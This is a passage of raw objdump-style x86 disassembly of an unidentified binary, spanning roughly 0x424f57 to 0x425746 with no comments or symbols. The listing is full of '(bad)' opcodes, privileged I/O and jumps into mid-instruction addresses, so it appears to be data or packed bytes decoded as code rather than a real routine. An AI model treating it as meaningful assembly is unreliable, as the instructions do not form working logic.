  424f57:	lods   al,BYTE PTR ds:[esi]
  424f58:	fistp  WORD PTR [eax]
  424f5a:	add    eax,0x5b83edc3
  424f5f:	xchg   esp,eax
  424f60:	pushf  
  424f61:	xchg   esi,ebp
  424f63:	bound  ebx,QWORD PTR [ecx-0x3082d5a9]
  424f69:	and    al,0x81
  424f6b:	mov    al,0x46
  424f6d:	mov    edx,0xc02d8659
  424f72:	repz frstor [edi-0x2e3370c0]
  424f79:	pop    ebx
  424f7a:	ret    0x51f7
  424f7d:	jecxz  0x424f06
  424f7f:	mov    ds,WORD PTR [edi-0x4]
  424f82:	mov    BYTE PTR [edi-0x74],al
  424f85:	add    ch,cl
  424f87:	xchg   esp,eax
  424f88:	(bad)  
  424f8a:	jl     0x424f0f
  424f8c:	scas   al,BYTE PTR es:[edi]
  424f8d:	stos   DWORD PTR es:[edi],eax
  424f8e:	mov    al,ds:0xb9601c7b
  424f93:	sbb    ecx,DWORD PTR [edx]
  424f95:	mov    eax,0x968104da
  424f9a:	cmp    DWORD PTR [edi],ebp
  424f9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f9d:	ret    
  424f9e:	add    ebp,edx
  424fa0:	(bad)  
  424fa1:	mov    edx,edi
  424fa3:	push   ecx
  424fa4:	pop    ebp
  424fa5:	cdq    
  424fa6:	and    BYTE PTR [ebp-0x2e],0x4c
  424faa:	dec    ebx
  424fab:	(bad)  
  424fac:	js     0x424f34
  424fae:	daa    
  424faf:	call   0x8e25a5c0
  424fb4:	stos   DWORD PTR es:[edi],eax
  424fb5:	cmc    
  424fb6:	push   ss
  424fb7:	pop    esi
  424fb8:	(bad)  
  424fb9:	and    eax,0xb4570d14
  424fbe:	push   ds
  424fbf:	jmp    0x424f6b
  424fc1:	ret    0xaac5
  424fc4:	pop    ebx
  424fc5:	inc    ecx
  424fc6:	inc    esp
  424fc7:	rcr    DWORD PTR [esi+0x6c],0x69
  424fcb:	ret    0x241d
  424fce:	and    eax,0x6eac7575
  424fd3:	neg    edx
  424fd5:	enter  0x252e,0x52
  424fd9:	ins    BYTE PTR es:[edi],dx
  424fda:	out    0xb1,al
  424fdc:	pop    es
  424fdd:	enter  0x65c4,0xef
  424fe1:	cmp    BYTE PTR ds:0x7ea1a780,dl
  424fe7:	inc    esp
  424fe8:	jnp    0x424fd6
  424fea:	scas   al,BYTE PTR es:[edi]
  424feb:	stc    
  424fec:	adc    BYTE PTR [esi-0x54],bl
  424fef:	lods   al,BYTE PTR ds:[esi]
  424ff0:	fnstsw WORD PTR [esi]
  424ff2:	mov    edi,0x3b09a7c1
  424ff7:	xor    dh,BYTE PTR [edx]
  424ff9:	shl    DWORD PTR [eax-0x48],0x2f
  424ffd:	aam    0xcc
  424fff:	or     eax,0xa3a01213
  425004:	dec    ebx
  425005:	mov    esp,DWORD PTR [edi+0x4335d674]
  42500b:	add    cl,0x9d
  42500e:	xor    ch,ch
  425010:	iret   
  425011:	or     BYTE PTR ds:0x7dd1ff04,bl
  425017:	dec    esi
  425018:	popa   
  425019:	ret    0x1177
  42501c:	inc    ecx
  42501d:	out    dx,eax
  42501e:	loop   0x42507a
  425020:	rol    DWORD PTR [edx+0x67],cl
  425023:	jg     0x425007
  425025:	cwde   
  425026:	fmul   QWORD PTR [eax+0x47]
  425029:	ficom  DWORD PTR [ecx]
  42502b:	mov    ebx,0xd6ac7890
  425030:	aad    0xf0
  425032:	jmp    0x54502e6e
  425037:	mov    ds:0x98b06ee1,eax
  42503c:	sbb    DWORD PTR [edi],ebp
  42503e:	je     0x425056
  425040:	mov    ah,0x2f
  425042:	rcl    BYTE PTR [edx+eiz*4-0x7298980c],cl
  425049:	outs   dx,DWORD PTR ds:[esi]
  42504a:	sbb    al,0x5d
  42504c:	push   es
  42504d:	ds inc esp
  42504f:	cmp    al,0x46
  425051:	addr16 gs clc 
  425054:	out    0x2b,eax
  425056:	imul   ebx,DWORD PTR [ecx+0x19],0xffffffac
  42505a:	adc    bl,BYTE PTR [edi-0x16f5882]
  425060:	cmovno ecx,ebx
  425063:	adc    DWORD PTR [esi+0x45],esi
  425066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425067:	mov    ah,0x4
  425069:	sbb    BYTE PTR [ecx+0x7c],0x5
  42506d:	and    bl,cl
  42506f:	cmp    ah,BYTE PTR [ebp+0x7cf7fe82]
  425075:	jecxz  0x425063
  425077:	push   eax
  425078:	dec    esi
  425079:	pop    esi
  42507a:	cs fwait
  42507c:	mov    esi,0xcfa32c04
  425081:	and    al,0xdc
  425083:	add    edi,ebx
  425085:	mov    ah,0xd5
  425087:	push   edx
  425088:	or     BYTE PTR [ebx+ecx*8+0x28],ah
  42508c:	lds    eax,FWORD PTR [ebx+0x5863e355]
  425092:	scas   eax,DWORD PTR es:[edi]
  425093:	sub    eax,DWORD PTR ds:0xebf13d09
  425099:	jae    0x4250b8
  42509b:	xchg   DWORD PTR [ecx-0x4e2e69c5],edx
  4250a1:	xchg   DWORD PTR [edi],ebp
  4250a3:	fcomp  DWORD PTR [esi-0x28062ab1]
  4250a9:	das    
  4250aa:	(bad)  
  4250ac:	out    0x40,al
  4250ae:	out    0x74,al
  4250b0:	jmp    0x425044
  4250b2:	jo     0x4250b1
  4250b4:	fdiv   QWORD PTR [eax+0x741d27e2]
  4250ba:	sbb    edi,DWORD PTR [ebx]
  4250bc:	ins    DWORD PTR es:[edi],dx
  4250bd:	sub    BYTE PTR [edi+ebx*4],0x6f
  4250c1:	pop    ebp
  4250c2:	mov    al,BYTE PTR [eax-0x10]
  4250c5:	call   0x2c7:0x943f8c2a
  4250cc:	aam    0xcf
  4250ce:	add    DWORD PTR [edi+edx*4],esp
  4250d1:	data16 adc al,0xc4
  4250d4:	sub    eax,0x9389a39a
  4250d9:	mul    dl
  4250db:	fwait
  4250dc:	sub    eax,0x77ef5e59
  4250e1:	pop    esp
  4250e2:	cmp    ah,0x49
  4250e5:	mov    dh,0x32
  4250e7:	xchg   esi,eax
  4250e8:	data16 stc 
  4250ea:	inc    ecx
  4250eb:	push   edx
  4250ec:	pop    edx
  4250ed:	mov    cl,BYTE PTR [edx+0x5c0a48d7]
  4250f3:	push   cs
  4250f4:	idiv   dl
  4250f6:	xor    DWORD PTR [edi],ebp
  4250f8:	scas   al,BYTE PTR es:[edi]
  4250f9:	outs   dx,DWORD PTR ds:[esi]
  4250fa:	clc    
  4250fb:	and    ch,BYTE PTR [eax]
  4250fd:	or     bh,BYTE PTR [ebx+0x74]
  425100:	test   BYTE PTR [ebx-0x7404f372],bl
  425106:	in     eax,dx
  425107:	outs   dx,DWORD PTR ds:[esi]
  425108:	and    esp,DWORD PTR [ebx+0x59]
  42510b:	push   ebp
  42510c:	push   esp
  42510d:	push   edx
  42510e:	pop    esp
  42510f:	push   ebx
  425110:	pop    edi
  425111:	pop    edi
  425112:	xchg   ebx,eax
  425113:	stos   DWORD PTR es:[edi],eax
  425114:	mov    ebx,0x727c1b96
  425119:	les    ecx,FWORD PTR [eax-0x21]
  42511c:	add    DWORD PTR [eax],eax
  42511e:	mov    BYTE PTR [esi],al
  425120:	add    BYTE PTR [eax],al
  425122:	inc    ebx
  425123:	enter  0xdcd,0x3a
  425127:	or     DWORD PTR [edi],edx
  425129:	xchg   DWORD PTR [eax-0x5],edx
  42512c:	jae    0x425124
  42512e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42512f:	pusha  
  425130:	mov    dl,0x65
  425132:	fisubr WORD PTR [eax]
  425134:	xchg   DWORD PTR [ebx-0x1e],edi
  425137:	cmp    eax,0x2aa35cc8
  42513c:	cdq    
  42513d:	pushf  
  42513e:	fild   WORD PTR [edx-0x4c]
  425141:	out    dx,eax
  425142:	ret    0x5e5
  425145:	leave  
  425146:	fnstcw WORD PTR [edx]
  425148:	jge    0x4250cf
  42514a:	pop    ss
  42514b:	stos   BYTE PTR es:[edi],al
  42514c:	ror    DWORD PTR [esi+esi*8+0x1],cl
  425150:	iret   
  425151:	test   al,0xeb
  425153:	dec    ebx
  425154:	sbb    dh,BYTE PTR [esi]
  425156:	mov    dh,0xc4
  425158:	ret    0x1db0
  42515b:	test   eax,0x17f5d22e
  425160:	jl     0x42517e
  425162:	retfw  
  425164:	and    ebx,DWORD PTR [esi]
  425166:	or     esp,esi
  425168:	adc    WORD PTR [ebx],ax
  42516b:	xlat   BYTE PTR ds:[ebx]
  42516c:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  42516e:	loop   0x425120
  425170:	cs (bad) 
  425172:	fucom  st(7)
  425174:	test   DWORD PTR [eax+0x79],ebx
  425177:	sbb    eax,0xb3dc0e8
  42517c:	dec    edx
  42517d:	sub    dl,bl
  42517f:	int3   
  425180:	push   ebx
  425181:	pop    ebp
  425182:	pop    es
  425183:	pop    eax
  425184:	and    dh,BYTE PTR [esp+eax*2-0x13]
  425188:	scas   eax,DWORD PTR es:[edi]
  425189:	fiadd  WORD PTR [esi]
  42518b:	adc    al,BYTE PTR [ecx-0x7a]
  42518e:	jle    0x425110
  425190:	(bad)  
  425191:	out    dx,al
  425192:	out    0x6c,eax
  425194:	inc    ebp
  425195:	lods   eax,DWORD PTR ds:[esi]
  425196:	or     dh,BYTE PTR [edx]
  425198:	and    DWORD PTR [ebp-0x7c8bccd2],0xdc0a2e3d
  4251a2:	ins    DWORD PTR es:[edi],dx
  4251a3:	inc    eax
  4251a4:	mov    al,ds:0xdb91c7da
  4251a9:	mov    dl,0xba
  4251ab:	bound  edx,QWORD PTR [edi]
  4251ad:	inc    esp
  4251ae:	jmp    0xdca6:0x66ec0a2d
  4251b5:	call   0x3fdccb82
  4251ba:	adc    DWORD PTR [edx],ebp
  4251bc:	push   edx
  4251bd:	dec    eax
  4251be:	jnp    0x4251b0
  4251c0:	dec    ebx
  4251c1:	sar    DWORD PTR ds:0xdb81ede5,cl
  4251c7:	out    0xc6,al
  4251c9:	popf   
  4251ca:	sub    al,0x2f
  4251cc:	mov    dl,0x24
  4251ce:	xor    DWORD PTR [ecx+0xf],0x4e664a7b
  4251d5:	lahf   
  4251d6:	jle    0x425158
  4251d8:	retf   0x73b2
  4251db:	sub    dl,BYTE PTR [esi-0x51]
  4251de:	or     DWORD PTR [eax+0x66],ebx
  4251e1:	repnz sbb cl,BYTE PTR [eax+0x7709ab65]
  4251e8:	(bad)  
  4251e9:	jmp    0x1219:0xfcfea622
  4251f0:	mov    ebx,DWORD PTR [edx+0x2e9691b8]
  4251f6:	and    ebp,DWORD PTR [ebx+0x476b7765]
  4251fc:	pop    esp
  4251fd:	pushf  
  4251fe:	mov    dh,0x86
  425200:	dec    edi
  425201:	sub    BYTE PTR [esi-0x68],cl
  425204:	add    eax,0xaaed63f4
  425209:	inc    edx
  42520a:	loop   0x425272
  42520c:	mov    DWORD PTR [edx+0x2705b120],edi
  425212:	push   es
  425213:	sbb    eax,0xfd2fb40d
  425218:	stos   BYTE PTR es:[edi],al
  425219:	push   esi
  42521a:	push   0x1f265906
  42521f:	arpl   WORD PTR [esi+0x74],bp
  425222:	cmp    DWORD PTR [esi+edx*4],0x79d62f66
  425229:	pop    edi
  42522a:	rcr    dl,cl
  42522c:	scas   eax,DWORD PTR es:[edi]
  42522d:	cs inc ecx
  42522f:	jle    0x4251b9
  425231:	stos   DWORD PTR es:[edi],eax
  425232:	xchg   ebx,eax
  425233:	ds push ebx
  425235:	and    DWORD PTR [ecx],esp
  425237:	popa   
  425238:	ret    
  425239:	mov    ebx,0x3cb3524f
  42523e:	fistp  QWORD PTR [ecx+0xa070153]
  425244:	js     0x4251d5
  425246:	test   DWORD PTR [eax-0x28],ebp
  425249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42524a:	lods   eax,DWORD PTR ds:[esi]
  42524b:	pop    esp
  42524c:	dec    edi
  42524d:	mov    bl,bh
  42524f:	mov    al,ds:0xd140a0fc
  425254:	rcl    BYTE PTR [edx+0x7d847d1e],0x9f
  42525b:	cmc    
  42525c:	adc    al,0x90
  42525e:	mov    edi,0x1e63cee4
  425263:	jne    0x4252a8
  425265:	pushf  
  425266:	mov    ecx,0x80b41539
  42526b:	dec    DWORD PTR [edx]
  42526d:	pop    ecx
  42526e:	adc    eax,0xf9527f8a
  425273:	jbe    0x425201
  425275:	popf   
  425276:	add    eax,0x3cff5250
  42527b:	cmp    BYTE PTR [edi+0x63bb2b52],ch
  425281:	mov    ch,0x68
  425283:	add    ah,BYTE PTR [esi+edx*8]
  425286:	int    0xc1
  425288:	test   DWORD PTR [edx+0x49daaf27],ebx
  42528e:	adc    esp,DWORD PTR [ebx-0x79]
  425291:	jno    0x4252e9
  425293:	mov    al,ds:0x352fdd44
  425298:	repz lea eax,[esi+0x2fd13b9a]
  42529f:	sub    al,0xe6
  4252a1:	sub    al,0xc2
  4252a3:	pop    ebp
  4252a4:	inc    edx
  4252a5:	fbstp  TBYTE PTR [ebx+edx*1+0x57]
  4252a9:	or     esp,DWORD PTR [eax+0x50]
  4252ac:	sbb    BYTE PTR [esp+ebp*1],cl
  4252af:	sub    eax,0xa10f2aa6
  4252b4:	pop    ss
  4252b5:	fldcw  WORD PTR [esi+0x36b36523]
  4252bb:	push   ds
  4252bc:	in     al,0x98
  4252be:	outs   dx,BYTE PTR ds:[esi]
  4252bf:	cmp    eax,0xa4623196
  4252c4:	sahf   
  4252c5:	rol    edi,0x40
  4252c8:	lds    esi,FWORD PTR [eax+0x8114245]
  4252ce:	aas    
  4252cf:	call   0xbe58bea2
  4252d4:	bound  esi,QWORD PTR ds:0xf74c3ff1
  4252da:	nop
  4252db:	(bad)  
  4252dc:	jo     0x425319
  4252de:	jge    0x4252b1
  4252e0:	das    
  4252e1:	lahf   
  4252e2:	test   BYTE PTR [edx],bh
  4252e4:	xchg   ebp,eax
  4252e5:	sti    
  4252e6:	popf   
  4252e7:	ja     0x42532f
  4252e9:	call   0x177d:0x29b55936
  4252f0:	mov    ds:0xac79a384,eax
  4252f5:	inc    esp
  4252f6:	push   ecx
  4252f7:	sbb    DWORD PTR [ebp-0x197a4176],edx
  4252fd:	cmp    al,0xab
  4252ff:	xor    al,0xec
  425301:	cmp    BYTE PTR [ecx+eiz*8-0x359524fe],0x73
  425309:	push   eax
  42530a:	js     0x42533f
  42530c:	inc    esp
  42530d:	mov    edx,DWORD PTR [eax]
  42530f:	(bad)  
  425310:	xor    bl,ah
  425312:	(bad)  
  425313:	pop    edx
  425314:	lds    edx,FWORD PTR [esi]
  425316:	or     dh,BYTE PTR [edx-0x7d641bf4]
  42531c:	mov    edx,0x771c1792
  425321:	or     eax,0x1f86272
  425326:	(bad)  
  425328:	sti    
  425329:	adc    DWORD PTR [ebx],0x748acfe0
  42532f:	mov    ch,0x31
  425331:	and    al,0x53
  425333:	cmp    al,0x6a
  425335:	fbstp  TBYTE PTR [ebp+0x6e]
  425338:	jne    0x425344
  42533a:	sti    
  42533b:	inc    esi
  42533c:	ins    BYTE PTR es:[edi],dx
  42533d:	xor    BYTE PTR [esi+0x7c605fb4],bh
  425343:	std    
  425344:	xchg   ecx,eax
  425345:	mov    eax,ds:0xd32bfc1f
  42534a:	ins    BYTE PTR es:[edi],dx
  42534b:	cmp    DWORD PTR [edx+0x5f130b05],ebp
  425351:	cs xor bl,ah
  425354:	(bad)  
  425355:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425356:	add    eax,0x62f8faa6
  42535b:	shr    BYTE PTR [ecx-0x12b2cf04],0x69
  425362:	popa   
  425363:	pop    ebx
  425364:	(bad)
  425367:	pop    edx
  425368:	jecxz  0x425310
  42536a:	adc    ebp,eax
  42536c:	xor    BYTE PTR ds:0x8649918d,dl
  425372:	push   ecx
  425373:	mov    al,ds:0xf37c469d
  425378:	ins    DWORD PTR es:[edi],dx
  425379:	mov    esp,0xfec513b9
  42537e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42537f:	cmp    bl,BYTE PTR [edi-0x6d]
  425382:	daa    
  425383:	sbb    eax,0xff832cae
  425389:	push   0x34177fde
  42538e:	mov    eax,ds:0x4c0f9cf2
  425393:	fistp  DWORD PTR ds:0x2cd2aa34
  42539a:	dec    ecx
  42539b:	and    eax,0xf75fdbdb
  4253a0:	mov    ds:0x1f6b620e,al
  4253a5:	iret   
  4253a6:	xor    DWORD PTR [eax+0x730b4b29],ecx
  4253ac:	loope  0x425348
  4253ae:	std    
  4253af:	and    ecx,DWORD PTR [edx-0x66]
  4253b2:	push   0xffffff97
  4253b4:	dec    eax
  4253b5:	adc    BYTE PTR [ecx],bl
  4253b7:	imul   esi,eax,0x3a
  4253ba:	test   DWORD PTR [eax+0x35],eax
  4253bd:	jb     0x4253be
  4253bf:	bound  edx,QWORD PTR [ebx-0x4c4c7ddc]
  4253c5:	das    
  4253c6:	je     0x425366
  4253c8:	in     eax,0xc2
  4253ca:	lods   al,BYTE PTR ds:[esi]
  4253cb:	retf   
  4253cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253cd:	pop    edi
  4253ce:	mov    dl,0x2f
  4253d0:	mov    al,0x13
  4253d2:	ja     0x425407
  4253d4:	inc    eax
  4253d5:	retf   0x2128
  4253d8:	in     al,dx
  4253d9:	in     eax,dx
  4253da:	aad    0xad
  4253dc:	into   
  4253dd:	mov    dl,bl
  4253df:	loope  0x425390
  4253e1:	jae    0x425439
  4253e3:	cmp    DWORD PTR [edx],ebx
  4253e5:	add    DWORD PTR [edx+0x60228912],esi
  4253eb:	xchg   esi,eax
  4253ec:	sti    
  4253ed:	mov    edi,0x12d584fd
  4253f2:	mov    ebp,0xa4cc8f61
  4253f7:	aas    
  4253f8:	stos   DWORD PTR es:[edi],eax
  4253f9:	iret   
  4253fa:	pop    eax
  4253fb:	push   0x8
  4253fd:	xlat   BYTE PTR ds:[ebx]
  4253fe:	scas   al,BYTE PTR es:[edi]
  4253ff:	mov    bh,0x9a
  425401:	outs   dx,BYTE PTR ds:[esi]
  425402:	dec    edx
  425403:	lods   al,BYTE PTR ds:[esi]
  425404:	pusha  
  425405:	je     0x425469
  425407:	pusha  
  425408:	and    DWORD PTR [esi],edi
  42540a:	cld    
  42540b:	sub    eax,0x423d5562
  425410:	xor    DWORD PTR ds:[edx],edi
  425413:	sub    al,0xa9
  425415:	pop    es
  425416:	daa    
  425417:	hlt    
  425418:	clc    
  425419:	adc    eax,DWORD PTR [eax+0x21]
  42541c:	cwde   
  42541d:	adc    ecx,DWORD PTR [eax-0x567c59fe]
  425423:	mov    ebx,DWORD PTR [esi+esi*1+0x2a840ef0]
  42542a:	mov    ds:0xaaee54a9,eax
  42542f:	aas    
  425430:	and    bl,al
  425432:	outs   dx,BYTE PTR ds:[esi]
  425433:	and    al,0xa8
  425435:	xchg   edx,eax
  425436:	pop    ds
  425437:	add    ebx,0xf85fe6b2
  42543d:	aaa    
  42543e:	ins    BYTE PTR es:[edi],dx
  42543f:	pop    eax
  425440:	int    0xfc
  425442:	push   0xe88ad5d3
  425447:	stc    
  425448:	aad    0xf2
  42544a:	and    DWORD PTR [esi+0x2e],0xa761d3af
  425451:	mov    edi,0x367a1ab2
  425456:	(bad)  
  425457:	inc    esi
  425458:	fisub  WORD PTR [ebx]
  42545a:	das    
  42545b:	jb     0x425457
  42545d:	jnp    0x4254ca
  42545f:	xor    DWORD PTR [ebp+0x9db4b7a],eax
  425465:	cmp    eax,ebx
  425467:	lahf   
  425468:	pop    ecx
  425469:	cld    
  42546a:	cmp    eax,0xe9fd4646
  42546f:	cli    
  425470:	ret    0x849a
  425473:	into   
  425474:	or     esi,esp
  425476:	and    DWORD PTR [ebp-0x6e],edx
  425479:	and    al,BYTE PTR [eax+0x4]
  42547c:	push   es
  42547d:	je     0x425482
  42547f:	push   es
  425480:	push   0xffffffc2
  425482:	mov    bl,0x42
  425484:	add    dh,dl
  425486:	btc    DWORD PTR [edx+0x4398566e],0x7
  42548e:	adc    eax,0xa9e12057
  425493:	test   eax,0xc9b1a87c
  425498:	push   edx
  425499:	mov    bh,0xf1
  42549b:	arpl   WORD PTR [ebp-0x7a4055ec],sp
  4254a1:	popa   
  4254a2:	pop    ss
  4254a3:	fist   DWORD PTR [edx]
  4254a5:	inc    eax
  4254a6:	ja     0x425510
  4254a8:	and    eax,0xa3e2210f
  4254ad:	call   0x6478:0x2248546b
  4254b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4254b5:	rcr    DWORD PTR [edx*4-0xe002207],0xe9
  4254bd:	je     0x42552b
  4254bf:	mov    bh,0xb4
  4254c1:	xchg   esi,eax
  4254c2:	and    BYTE PTR [ebp-0x6b42fdf6],al
  4254c8:	push   edi
  4254c9:	sbb    dh,BYTE PTR [ecx-0x5155fcdb]
  4254cf:	sbb    cl,BYTE PTR [ebx-0x49]
  4254d2:	call   0x5e86:0xba63eab0
  4254d9:	inc    esp
  4254da:	js     0x4254bf
  4254dc:	(bad)  
  4254dd:	xor    eax,0xeea6ff28
  4254e2:	enter  0x2ccb,0xd7
  4254e6:	arpl   si,bx
  4254e8:	add    al,0x16
  4254ea:	jo     0x425545
  4254ec:	cld    
  4254ed:	scas   eax,DWORD PTR es:[edi]
  4254ee:	aad    0xa
  4254f0:	mov    BYTE PTR [esi+0xbb9d339],bl
  4254f6:	loope  0x425516
  4254f8:	aam    0x37
  4254fa:	mov    BYTE PTR [edi-0x776ac5a],dh
  425500:	imul   edx
  425502:	and    eax,0x729e4d63
  425507:	and    eax,0x3a6de259
  42550c:	adc    DWORD PTR [ebp+0x2f06f63],ebx
  425512:	mov    bh,0x2a
  425514:	or     esi,DWORD PTR [ecx-0x5d99d6a8]
  42551a:	shl    DWORD PTR [esi-0x76],cl
  42551d:	or     al,0x12
  42551f:	push   eax
  425520:	not    ch
  425522:	pop    esi
  425523:	and    dh,BYTE PTR [edi]
  425525:	div    DWORD PTR [edi+0x43]
  425528:	int3   
  425529:	fimul  DWORD PTR [edx-0x30]
  42552c:	jne    0x42558d
  42552e:	mov    edi,0xa001ad2d
  425533:	clc    
  425534:	pop    edx
  425535:	(bad)  
  425536:	push   esi
  425537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425538:	aad    0x56
  42553a:	push   0x45
  42553c:	int3   
  42553d:	sub    BYTE PTR [edx+0x16081299],al
  425543:	mov    dl,0xd7
  425545:	inc    ebx
  425546:	or     eax,0x4b
  425549:	shl    eax,0xec
  42554c:	es xor cl,dl
  42554f:	mov    ebx,0x223fd8a5
  425554:	cmovg  ebp,DWORD PTR [ecx]
  425557:	xor    WORD PTR [esi],cx
  42555a:	mov    al,0x12
  42555c:	cli    
  42555d:	add    esp,ebp
  42555f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425560:	pop    es
  425561:	adc    eax,eax
  425563:	sub    BYTE PTR [ebp-0x53],bh
  425566:	xchg   DWORD PTR [ebx],ebx
  425568:	inc    edx
  425569:	mov    ecx,0x646be3b8
  42556e:	test   eax,0x110d32ca
  425573:	adc    esp,DWORD PTR [edx+0x69]
  425576:	cmp    eax,0x2e2714a1
  42557b:	jp     0x4255ae
  42557d:	enter  0xd103,0x9c
  425581:	adc    bl,dh
  425583:	mov    BYTE PTR [edi],dl
  425585:	jbe    0x42558c
  425587:	xlat   BYTE PTR ds:[ebx]
  425588:	pop    esi
  425589:	imul   ebp,DWORD PTR [esi+0x5befa883],0x144c962d
  425593:	adc    dl,bh
  425595:	mov    ds:0x39c1ae05,al
  42559a:	sub    eax,0x87bb04ba
  42559f:	mov    DWORD PTR [eax-0x5bce2933],ecx
  4255a5:	fdivr  QWORD PTR [ecx+ebx*8-0x5b4b781a]
  4255ac:	push   ds
  4255ad:	sub    edi,DWORD PTR [edi]
  4255af:	cwde   
  4255b0:	aaa    
  4255b1:	mov    ch,ah
  4255b3:	aad    0x58
  4255b5:	sbb    esp,DWORD PTR [edx+0x3e]
  4255b8:	adc    ebx,DWORD PTR [ebx]
  4255ba:	sbb    al,0xb9
  4255bc:	mov    cl,0x8e
  4255be:	cwde   
  4255bf:	pop    eax
  4255c0:	cmp    eax,0x12f60729
  4255c5:	fstp   DWORD PTR [eax-0x76]
  4255c8:	int    0x8c
  4255ca:	mov    cl,0xa
  4255cc:	retf   0xeeb0
  4255cf:	jge    0x4255af
  4255d1:	mov    ch,0x74
  4255d3:	xchg   DWORD PTR [esi],ecx
  4255d5:	sbb    DWORD PTR [esi],ebp
  4255d7:	sbb    eax,0x394a021
  4255dc:	push   esp
  4255dd:	push   0xe46f479a
  4255e2:	test   cl,0xd3
  4255e5:	xor    eax,0x5c1bfe44
  4255ea:	in     al,0xd3
  4255ec:	or     DWORD PTR [ecx+0x54],esi
  4255ef:	data16 fidivr DWORD PTR [esi+0x3a119a39]
  4255f6:	paddd  mm2,mm2
  4255f9:	adc    DWORD PTR [ecx-0x669d72d4],esp
  4255ff:	retf   
  425600:	add    al,0x83
  425602:	scas   al,BYTE PTR es:[edi]
  425603:	inc    esi
  425604:	rcl    DWORD PTR [edx],cl
  425606:	ss cmc 
  425608:	push   edx
  425609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42560a:	inc    eax
  42560b:	std    
  42560c:	js     0x425663
  42560e:	imul   ebp,edi,0x56cb69bd
  425614:	push   esp
  425615:	lods   eax,DWORD PTR ds:[esi]
  425616:	in     al,0x72
  425618:	adc    ecx,esp
  42561a:	xchg   esp,eax
  42561b:	sub    al,0x71
  42561d:	(bad)  
  42561e:	jno    0x425604
  425620:	pop    eax
  425621:	dec    eax
  425622:	xchg   ecx,eax
  425623:	adc    edi,edx
  425625:	std    
  425626:	lds    ebp,FWORD PTR [edx-0x23]
  425629:	scas   eax,DWORD PTR es:[edi]
  42562a:	xor    cl,BYTE PTR [esp+eiz*4-0x1]
  42562e:	(bad)  [edi-0x7248eea5]
  425634:	pop    ebx
  425635:	sub    esp,DWORD PTR [ebx+0x22632431]
  42563b:	xchg   esp,eax
  42563c:	sar    BYTE PTR [bx+di+0x4c],1
  425640:	sbb    DWORD PTR [edx-0x2f],eax
  425643:	sti    
  425644:	push   esp
  425645:	cmp    eax,DWORD PTR [esi+0x76]
  425648:	mov    edi,0xc6a12d2d
  42564d:	cmp    BYTE PTR [eax],0x19
  425650:	rol    DWORD PTR [eax],1
  425652:	int    0x6d
  425654:	sub    BYTE PTR [esi+0x15d31dd6],ah
  42565a:	or     dl,BYTE PTR [ecx+eiz*4+0x57]
  42565e:	xor    al,0x37
  425660:	xchg   esi,eax
  425661:	test   DWORD PTR [ebx],eax
  425663:	test   bl,0x8e
  425666:	ret    0x6021
  425669:	xchg   ebx,eax
  42566a:	sub    ch,0xd9
  42566d:	mov    eax,0x1b35d49
  425672:	push   cs
  425673:	lods   al,BYTE PTR ds:[esi]
  425674:	mov    al,ds:0x48b0240
  425679:	cmp    eax,0xb97e5d43
  42567e:	fiadd  DWORD PTR [edx+0xd]
  425681:	cdq    
  425682:	pop    ebx
  425683:	mov    bl,0x14
  425685:	(bad)  
  425687:	add    eax,0xea3d3fb3
  42568c:	clc    
  42568d:	fbstp  TBYTE PTR [edx+0x6c]
  425690:	shl    bl,0xa8
  425693:	inc    eax
  425694:	repz xor al,0x9c
  425697:	mov    esi,0x8979560a
  42569c:	mov    ebp,0xd1dd8d51
  4256a1:	inc    eax
  4256a2:	ja     0x42564f
  4256a4:	lods   eax,DWORD PTR ds:[esi]
  4256a5:	fbld   TBYTE PTR [ecx+0x13a23f3b]
  4256ab:	add    cl,BYTE PTR [ecx-0x30]
  4256ae:	mov    esp,0x95b61ea9
  4256b3:	mov    ds:0x9cb4c418,eax
  4256b8:	shl    DWORD PTR [ecx],1
  4256ba:	icebp  
  4256bb:	(bad)  
  4256bc:	mov    BYTE PTR [ebx-0xe],dh
  4256bf:	fs adc al,0xf8
  4256c2:	mov    esp,0xdf27d342
  4256c7:	add    bl,0xfe
  4256ca:	dec    esi
  4256cb:	mov    eax,0x4cdfdd24
  4256d0:	jge    0x425738
  4256d2:	cmp    al,0x5
  4256d4:	jg     0x4256e1
  4256d6:	dec    edi
  4256d7:	inc    ebp
  4256d8:	ret    
  4256d9:	test   BYTE PTR [edx+0x38],dh
  4256dc:	mul    ecx
  4256de:	mov    WORD PTR [ebx+0x41f218ba],es
  4256e4:	xor    ecx,ebx
  4256e6:	and    cl,BYTE PTR [esi]
  4256e8:	popf   
  4256e9:	int3   
  4256ea:	nop
  4256eb:	repz fcomi st,st(2)
  4256ee:	in     eax,0x55
  4256f0:	lods   al,BYTE PTR ds:[esi]
  4256f1:	fistp  QWORD PTR [ebx+eiz*2]
  4256f4:	cld    
  4256f5:	retf   0xfa1c
  4256f8:	push   esp
  4256f9:	loopne 0x425752
  4256fb:	stos   DWORD PTR es:[edi],eax
  4256fc:	stc    
  4256fd:	gs xchg ebx,eax
  4256ff:	mov    eax,ds:0xbf707e1f
  425704:	xlat   BYTE PTR ds:[ebx]
  425705:	cs jge 0x425785
  425708:	loopne 0x4256f7
  42570a:	jg     0x42577c
  42570c:	pmaxsw mm4,QWORD PTR [ecx+0x6cf92538]
  425713:	std    
  425714:	call   0x8bce:0xf4657f9a
  42571b:	(bad)
  42571e:	icebp  
  42571f:	imul   esi,eax,0xffffffff
  425722:	pushf  
  425723:	call   0x922a769c
  425728:	les    ebp,FWORD PTR [edx+edi*4-0x69]
  42572c:	in     al,0xe4
  42572e:	or     DWORD PTR [eax-0x3b69c22e],0xa00952d8
  425738:	push   ds
  425739:	enter  0x9c75,0x1c
  42573d:	ror    BYTE PTR [edx+0x5d],1
  425740:	cdq    
  425741:	xchg   ecx,eax
  425742:	push   ss
  425743:	inc    eax
  425744:	mov    ah,0x33
  425746:	sub    bh,BYTE PTR [ecx]
